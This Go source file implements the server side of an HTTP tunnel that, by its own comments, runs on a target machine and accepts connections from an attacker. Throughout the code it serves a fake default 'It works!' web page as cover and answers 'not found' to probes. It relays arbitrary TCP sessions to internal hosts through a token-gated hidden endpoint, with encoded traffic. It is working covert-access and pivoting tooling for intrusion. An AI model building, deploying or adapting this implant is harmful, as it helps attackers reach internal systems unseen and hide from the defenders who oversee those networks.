package httptunnel

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"sync"
	"time"
)

// Server handles HTTP requests and relays TCP connections to internal hosts.
// Runs on the TARGET machine. Accepts inbound HTTP from the attacker.
type Server struct {
	listenAddr string
	key        []byte
	path       string // URL path for tunnel endpoint (default "/b")
	sessions   sync.Map
	logger     *log.Logger
	httpServer *http.Server
}

// tcpSession tracks an individual relayed TCP connection.
type tcpSession struct {
	conn    net.Conn
	id      string
	target  string
	created time.Time
	lastUse time.Time
	mu      sync.Mutex
}

// connectResponse is returned by the connect command.
type connectResponse struct {
	SID string `json:"sid"`
}

// ServerConfig holds configuration for the HTTP tunnel server.
type ServerConfig struct {
	ListenAddr string
	Key        []byte
	Path       string
	Logger     *log.Logger
}

// NewServer creates a new HTTP tunnel server.
func NewServer(cfg *ServerConfig) *Server {
	path := cfg.Path
	if path == "" {
		path = "/b"
	}
	logger := cfg.Logger
	if logger == nil {
		logger = log.Default()
	}
	return &Server{
		listenAddr: cfg.ListenAddr,
		key:        cfg.Key,
		path:       path,
		logger:     logger,
	}
}

// Start begins the HTTP tunnel server. Blocks until context is cancelled.
func (s *Server) Start(ctx context.Context) error {
	mux := http.NewServeMux()
	mux.HandleFunc(s.path, s.handleTunnel)
	mux.HandleFunc("/", s.handleCover)

	s.httpServer = &http.Server{
		Addr:              s.listenAddr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}

	// Session cleanup goroutine: close idle sessions after 5 minutes
	go s.cleanupLoop(ctx)

	s.logger.Printf("[httptunnel-server] listening on %s (path: %s)", s.listenAddr, s.path)

	errCh := make(chan error, 1)
	go func() {
		errCh <- s.httpServer.ListenAndServe()
	}()

	select {
	case <-ctx.Done():
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		s.httpServer.Shutdown(shutdownCtx)
		s.closeAllSessions()
		return nil
	case err := <-errCh:
		if err == http.ErrServerClosed {
			return nil
		}
		return fmt.Errorf("httptunnel server: %w", err)
	}
}

// handleCover serves a fake HTML page on GET / for cover.
func (s *Server) handleCover(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, `<!DOCTYPE html>
<html><head><title>Welcome</title></head>
<body><h1>It works!</h1><p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added yet.</p>
</body></html>`)
}

// handleTunnel dispatches tunnel commands.
func (s *Server) handleTunnel(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	// Authentication check
	if len(s.key) > 0 {
		token := r.Header.Get("X-Token")
		if token != AuthToken(s.key) {
			http.NotFound(w, r)
			return
		}
	}

	cmd := r.URL.Query().Get("cmd")

	switch cmd {
	case CmdConnect:
		s.handleConnect(w, r)
	case CmdSend:
		s.handleSend(w, r)
	case CmdRecv:
		s.handleRecv(w, r)
	case CmdDisconnect:
		s.handleDisconnect(w, r)
	case CmdPing:
		s.handlePing(w, r)
	default:
		http.NotFound(w, r)
	}
}

// handleConnect opens a TCP connection to the specified target.
func (s *Server) handleConnect(w http.ResponseWriter, r *http.Request) {
	target := r.URL.Query().Get("target")
	if target == "" {
		http.Error(w, "missing target", http.StatusBadRequest)
		return
	}

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		s.logger.Printf("[httptunnel-server] connect to %s failed: %v", target, err)
		http.Error(w, "connection failed", http.StatusBadGateway)
		return
	}

	sid := GenerateSessionID()
	sess := &tcpSession{
		conn:    conn,
		id:      sid,
		target:  target,
		created: time.Now(),
		lastUse: time.Now(),
	}
	s.sessions.Store(sid, sess)

	s.logger.Printf("[httptunnel-server] session %s: connected to %s", sid, target)

	resp := connectResponse{SID: sid}
	data, err := json.Marshal(resp)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	// Encrypt the response if key is set
	if len(s.key) > 0 {
		w.Header().Set("Content-Type", "application/octet-stream")
		encoded := EncodePayload(data, s.key)
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(encoded))
	} else {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write(data)
	}
}

// handleSend writes data from the HTTP request body to the TCP connection.
func (s *Server) handleSend(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.getSession(r)
	if !ok {
		http.NotFound(w, r)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read body failed", http.StatusBadRequest)
		return
	}

	var data []byte
	if len(s.key) > 0 {
		data, err = DecodePayload(string(body), s.key)
		if err != nil {
			http.Error(w, "decode failed", http.StatusBadRequest)
			return
		}
	} else {
		data = body
	}

	sess.mu.Lock()
	sess.lastUse = time.Now()
	_, err = sess.conn.Write(data)
	sess.mu.Unlock()

	if err != nil {
		s.logger.Printf("[httptunnel-server] session %s: send error: %v", sess.id, err)
		s.removeSession(sess.id)
		http.Error(w, "send failed", http.StatusBadGateway)
		return
	}

	w.WriteHeader(http.StatusOK)
}

// handleRecv reads data from the TCP connection and returns it in the response.
func (s *Server) handleRecv(w http.ResponseWriter, r *http.Request) {
	sess, ok := s.getSession(r)
	if !ok {
		http.NotFound(w, r)
		return
	}

	sess.mu.Lock()
	sess.lastUse = time.Now()
	// Use short read deadline for non-blocking behavior
	sess.conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
	buf := make([]byte, 32768)
	n, err := sess.conn.Read(buf)
	sess.conn.SetReadDeadline(time.Time{}) // Clear deadline
	sess.mu.Unlock()

	if n > 0 {
		data := buf[:n]
		if len(s.key) > 0 {
			encoded := EncodePayload(data, s.key)
			w.Header().Set("Content-Type", "application/octet-stream")
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(encoded))
		} else {
			w.Header().Set("Content-Type", "application/octet-stream")
			w.WriteHeader(http.StatusOK)
			w.Write(data)
		}
		return
	}

	if err != nil {
		// Timeout is expected (no data available yet)
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			w.WriteHeader(http.StatusOK)
			return
		}
		// Real error: connection closed or broken
		s.logger.Printf("[httptunnel-server] session %s: recv error: %v", sess.id, err)
		s.removeSession(sess.id)
		http.Error(w, "recv failed", http.StatusBadGateway)
		return
	}

	// n == 0, no error (shouldn't happen but handle gracefully)
	w.WriteHeader(http.StatusOK)
}

// handleDisconnect closes the TCP connection and removes the session.
func (s *Server) handleDisconnect(w http.ResponseWriter, r *http.Request) {
	sid := r.URL.Query().Get("sid")
	if sid == "" {
		http.NotFound(w, r)
		return
	}

	s.removeSession(sid)
	s.logger.Printf("[httptunnel-server] session %s: disconnected", sid)
	w.WriteHeader(http.StatusOK)
}

// handlePing responds to keepalive checks.
func (s *Server) handlePing(w http.ResponseWriter, _ *http.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("pong"))
}

// getSession retrieves a session by the "sid" query parameter.
func (s *Server) getSession(r *http.Request) (*tcpSession, bool) {
	sid := r.URL.Query().Get("sid")
	if sid == "" {
		return nil, false
	}
	val, ok := s.sessions.Load(sid)
	if !ok {
		return nil, false
	}
	return val.(*tcpSession), true
}

// removeSession closes and removes a session by ID.
func (s *Server) removeSession(sid string) {
	val, ok := s.sessions.LoadAndDelete(sid)
	if ok {
		sess := val.(*tcpSession)
		sess.mu.Lock()
		sess.conn.Close()
		sess.mu.Unlock()
	}
}

// closeAllSessions closes all active TCP sessions.
func (s *Server) closeAllSessions() {
	s.sessions.Range(func(key, value any) bool {
		sess := value.(*tcpSession)
		sess.mu.Lock()
		sess.conn.Close()
		sess.mu.Unlock()
		s.sessions.Delete(key)
		return true
	})
}

// cleanupLoop periodically removes idle sessions (>5 minutes).
func (s *Server) cleanupLoop(ctx context.Context) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			s.cleanupIdleSessions()
		}
	}
}

// cleanupIdleSessions removes sessions idle for more than 5 minutes.
func (s *Server) cleanupIdleSessions() {
	now := time.Now()
	s.sessions.Range(func(key, value any) bool {
		sess := value.(*tcpSession)
		sess.mu.Lock()
		idle := now.Sub(sess.lastUse)
		sess.mu.Unlock()
		if idle > 5*time.Minute {
			s.logger.Printf("[httptunnel-server] session %s: idle timeout, closing", sess.id)
			s.removeSession(sess.id)
		}
		return true
	})
}
